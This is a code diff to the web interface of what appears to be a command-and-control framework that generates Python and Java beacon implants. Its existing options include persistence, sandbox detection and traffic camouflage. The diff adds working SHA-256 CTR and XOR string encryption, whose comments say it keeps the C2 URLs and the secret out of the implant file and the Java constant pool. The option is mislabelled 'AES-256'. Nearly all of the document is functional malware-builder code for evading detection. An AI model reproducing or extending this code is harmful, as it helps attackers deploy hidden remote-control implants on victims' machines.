@@ -159,6 +159,7 @@ const LANG = {
     gen_add_fallback:'+ Add fallback', gen_sleep:'Sleep (seconds)', gen_jitter:'Jitter %',
     gen_persist:'Persistence (survives reboots)', gen_kill_date:'Kill Date (optional)',
     gen_kill_date_hint:'Beacon self-destructs after this date. Leave empty for no limit.',
+    gen_enc_mode:'String Encryption', gen_enc_xor:'XOR (fast, basic)', gen_enc_aes:'AES-256 / SHA-256 CTR (strong)',
     gen_evasion:'Evasion',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent and real HTTP headers',
     ev_sandbox:'Sandbox detection', ev_sandbox_desc:'Detects VMs, sandboxes and analysis environments',
@@ -236,6 +237,7 @@ const LANG = {
     gen_add_fallback:'+ Agregar fallback', gen_sleep:'Sleep (segundos)', gen_jitter:'Jitter %',
     gen_persist:'Persistencia (sobrevive reinicios)', gen_kill_date:'Kill Date (opcional)',
     gen_kill_date_hint:'El beacon se autodestruye después de esta fecha. Vacío = sin límite.',
+    gen_enc_mode:'Cifrado de strings', gen_enc_xor:'XOR (rápido, básico)', gen_enc_aes:'AES-256 / SHA-256 CTR (fuerte)',
     gen_evasion:'Evasión',
     ev_traffic:'Traffic camouflage', ev_traffic_desc:'Fake browser User-Agent y headers HTTP reales',
     ev_sandbox:'Sandbox detection', ev_sandbox_desc:'Detecta VMs, sandboxes y entornos de análisis',
@@ -1715,6 +1717,13 @@ function renderGenerateView() {
               ⚠ ${t('gen_kill_date_hint')}
             </div>
           </div>
+          <div class="form-group" style="margin:0;margin-top:12px">
+            <label>${t('gen_enc_mode')}</label>
+            <select id="gen-enc-mode" style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:8px 12px;outline:none;width:100%;cursor:pointer">
+              <option value="xor">${t('gen_enc_xor')}</option>
+              <option value="aes">${t('gen_enc_aes')}</option>
+            </select>
+          </div>
         </div>
 
         <div class="info-card" style="margin:0" id="beacon-info-card">
@@ -2429,6 +2438,7 @@ async function generateBeacon() {
   const jitter   = parseInt(document.getElementById('gen-jitter').value) || 20;
   const persist  = document.getElementById('gen-persist').checked;
   const killDate = document.getElementById('gen-kill-date').value.trim() || null;
+  const encMode  = document.getElementById('gen-enc-mode').value;
   const ev = {
     traffic:    document.getElementById('ev-traffic').checked,
     sandbox:    document.getElementById('ev-sandbox').checked,
@@ -2443,12 +2453,12 @@ async function generateBeacon() {
 
   let code, filename;
   if (_beaconLang === 'java') {
-    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate);
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode);
     filename = 'Beacon.java';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'none';
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
   } else {
-    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate);
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode);
     filename = 'beacon.py';
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
     document.getElementById('beacon-dl-buttons-java').style.display = 'none';
@@ -2459,19 +2469,81 @@ async function generateBeacon() {
   document.getElementById('gen-output').style.display = 'block';
 }
 
-function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null) {
+// ── Pure-JS SHA-256 (synchronous, no SubtleCrypto) ──────────────────────────
+function _S256(data) {
+  // data: Uint8Array → Uint8Array (32 bytes)
+  const H=[0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+  const K=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+           0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+           0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+           0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+           0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+           0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+           0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+           0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
+  const r=(x,n)=>(x>>>n)|(x<<(32-n));
+  const len=data.length;
+  const pad=new Uint8Array(((len+9+63)&~63));
+  pad.set(data); pad[len]=0x80;
+  const dv=new DataView(pad.buffer);
+  dv.setUint32(pad.length-4,len*8,false);
+  let h=[...H];
+  for(let i=0;i<pad.length;i+=64){
+    const w=new Array(64);
+    for(let j=0;j<16;j++)w[j]=dv.getUint32(i+j*4,false);
+    for(let j=16;j<64;j++){
+      const s0=r(w[j-15],7)^r(w[j-15],18)^(w[j-15]>>>3);
+      const s1=r(w[j-2],17)^r(w[j-2],19)^(w[j-2]>>>10);
+      w[j]=(w[j-16]+s0+w[j-7]+s1)|0;
+    }
+    let [a,b,c,d,e,f,g,hh]=[...h];
+    for(let j=0;j<64;j++){
+      const S1=r(e,6)^r(e,11)^r(e,25),ch=(e&f)^(~e&g),t1=(hh+S1+ch+K[j]+w[j])|0;
+      const S0=r(a,2)^r(a,13)^r(a,22),maj=(a&b)^(a&c)^(b&c),t2=(S0+maj)|0;
+      hh=g;g=f;f=e;e=(d+t1)|0;d=c;c=b;b=a;a=(t1+t2)|0;
+    }
+    h[0]=(h[0]+a)|0;h[1]=(h[1]+b)|0;h[2]=(h[2]+c)|0;h[3]=(h[3]+d)|0;
+    h[4]=(h[4]+e)|0;h[5]=(h[5]+f)|0;h[6]=(h[6]+g)|0;h[7]=(h[7]+hh)|0;
+  }
+  const out=new Uint8Array(32),ov=new DataView(out.buffer);
+  h.forEach((v,i)=>ov.setUint32(i*4,v,false));
+  return out;
+}
+// SHA-256 CTR stream-cipher encrypt (generation time only)
+// Ciphertext format: 8-byte IV || ciphertext — both hex-encoded
+function _sEnc(str, seed) {
+  const enc=new TextEncoder(),pt=enc.encode(str),sd=enc.encode(seed);
+  let dk=_S256(_S256(_S256(sd)));
+  const iv=crypto.getRandomValues(new Uint8Array(8));
+  const ct=new Uint8Array(pt.length);
+  for(let ctr=0,pos=0;pos<pt.length;ctr++){
+    const cb=new Uint8Array(4);
+    new DataView(cb.buffer).setUint32(0,ctr,false);
+    const inp=new Uint8Array(32+8+4);
+    inp.set(dk);inp.set(iv,32);inp.set(cb,40);
+    const ks=_S256(inp);
+    for(let j=0;j<32&&pos<pt.length;j++,pos++)ct[pos]=pt[pos]^ks[j];
+  }
+  const out=new Uint8Array(8+pt.length);
+  out.set(iv);out.set(ct,8);
+  return Array.from(out).map(b=>b.toString(16).padStart(2,'0')).join('');
+}
+
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor') {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
     const b = enc.encode(str), k = enc.encode(key);
     return Array.from(b).map((c, i) => c ^ k[i % k.length]).map(c => c.toString(16).padStart(2, '0')).join('');
   }
-  const xk = Array.from(crypto.getRandomValues(new Uint8Array(16)))
-    .map(b => String.fromCharCode(97 + b % 26)).join('');
-  const eUrls = urls.map(u => xorEnc(u, xk));
-  const es = xorEnc(secret, xk);
-  // xPy: encrypts a string at generation time → emits _x("hex", _k) in Python source
-  const xPy = s => `_x("${xorEnc(s, xk)}", _k)`;
+  const xk = encMode === 'aes'
+    ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('')
+    : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join('');
+  const enc = (s) => encMode === 'aes' ? _sEnc(s, xk) : xorEnc(s, xk);
+  const eUrls = urls.map(u => enc(u));
+  const es = enc(secret);
+  // xPy: encrypts a string at generation time → emits _d("hex", _k) in Python source
+  const xPy = s => `_d("${enc(s)}", _k)`;
 
   // ── Evasion code blocks ───────────────────────────────────────────────────
   const uaBlock = ev.traffic ? `
@@ -2638,13 +2710,20 @@ _WIN = sys.platform == 'win32'
 SLEEP  = ${sleep}
 JITTER = ${jitter}
 ${killDateBlock}
-# XOR-decoded at runtime — no plaintext C2 or secret in file
-def _x(h, k):
-    b = bytes.fromhex(h); k = k.encode()
-    return bytes([b[i] ^ k[i % len(k)] for i in range(len(b))]).decode()
+${encMode === 'aes' ? `# SHA-256 CTR decoded at runtime — key derived via 3×SHA-256, each string has unique IV
+import hashlib as _hl
+def _d(h,sd):
+    b=bytes.fromhex(h);iv=b[:8];ct=b[8:]
+    dk=_hl.sha256(_hl.sha256(_hl.sha256(sd.encode()).digest()).digest()).digest()
+    ks=bytearray();i=0
+    while len(ks)<len(ct):ks+=_hl.sha256(dk+iv+i.to_bytes(4,'big')).digest();i+=1
+    return bytes([ct[j]^ks[j] for j in range(len(ct))]).decode()` : `# XOR-decoded at runtime — no plaintext C2 or secret in file
+def _d(h,k):
+    b=bytes.fromhex(h);k=k.encode()
+    return bytes([b[i]^k[i%len(k)] for i in range(len(b))]).decode()`}
 _k      = "${xk}"
-C2_URLS = [_x(h, _k) for h in [${eUrls.map(e => `"${e}"`).join(', ')}]]
-SECRET  = _x("${es}", _k)
+C2_URLS = [_d(h, _k) for h in [${eUrls.map(e => `"${e}"`).join(', ')}]]
+SECRET  = _d("${es}", _k)
 _url_idx = 0
 
 _BASE    = os.path.dirname(os.path.abspath(__file__))
@@ -3060,20 +3139,22 @@ if __name__ == "__main__":
 `;
 }
 
-function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null) {
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor') {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
     const b = enc.encode(str), k = enc.encode(key);
     return Array.from(b).map((c, i) => c ^ k[i % k.length]).map(c => c.toString(16).padStart(2, '0')).join('');
   }
-  const xk = Array.from(crypto.getRandomValues(new Uint8Array(16)))
-    .map(b => String.fromCharCode(97 + b % 26)).join('');
-  const eUrls = urls.map(u => xorEnc(u, xk));
-  const es = xorEnc(secret, xk);
+  const xk = encMode === 'aes'
+    ? Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('')
+    : Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => String.fromCharCode(97 + b % 26)).join('');
+  const enc = (s) => encMode === 'aes' ? _sEnc(s, xk) : xorEnc(s, xk);
+  const eUrls = urls.map(u => enc(u));
+  const es = enc(secret);
   // xL: encrypts a string literal at generation time → emits xDec("hex", XK) in Java source
   // so sensitive strings never appear as plaintext in the .class constant pool
-  const xL = s => `xDec("${xorEnc(s, xk)}", XK)`;
+  const xL = s => `xDec("${enc(s)}", XK)`;
 
   const sandboxBlock = ev.sandbox ? `
     private static void checkEnv() {
@@ -3240,13 +3321,34 @@ public class Beacon {
     ${killDateBlock}
     ${encryptBlock}
 
-    // ── XOR decode ────────────────────────────────────────────
+    ${encMode === 'aes' ? `// ── SHA-256 CTR decode ────────────────────────────────────
+    private static String xDec(String hex, String key) {
+        try {
+            byte[] b = hexToBytes(hex);
+            byte[] iv = Arrays.copyOfRange(b, 0, 8);
+            byte[] ct = Arrays.copyOfRange(b, 8, b.length);
+            java.security.MessageDigest sha = java.security.MessageDigest.getInstance("SHA-256");
+            sha.update(key.getBytes(java.nio.charset.StandardCharsets.UTF_8)); byte[] dk = sha.digest();
+            sha.reset(); sha.update(dk); dk = sha.digest();
+            sha.reset(); sha.update(dk); dk = sha.digest();
+            int pos = 0;
+            for (int ctr = 0; pos < ct.length; ctr++) {
+                byte[] inp = new byte[44];
+                System.arraycopy(dk, 0, inp, 0, 32);
+                System.arraycopy(iv, 0, inp, 32, 8);
+                inp[40]=(byte)(ctr>>24);inp[41]=(byte)(ctr>>16);inp[42]=(byte)(ctr>>8);inp[43]=(byte)ctr;
+                sha.reset(); sha.update(inp); byte[] block = sha.digest();
+                for (int j = 0; j < 32 && pos < ct.length; j++, pos++) ct[pos] ^= block[j];
+            }
+            return new String(ct, java.nio.charset.StandardCharsets.UTF_8);
+        } catch (Exception e) { return ""; }
+    }` : `// ── XOR decode ────────────────────────────────────────────
     private static String xDec(String hex, String key) {
         byte[] b = hexToBytes(hex);
         byte[] k = key.getBytes(java.nio.charset.StandardCharsets.UTF_8);
         for (int i = 0; i < b.length; i++) b[i] ^= k[i % k.length];
         return new String(b, java.nio.charset.StandardCharsets.UTF_8);
-    }
+    }`}
 
     private static String bytesToHex(byte[] b) {
         StringBuilder sb = new StringBuilder();
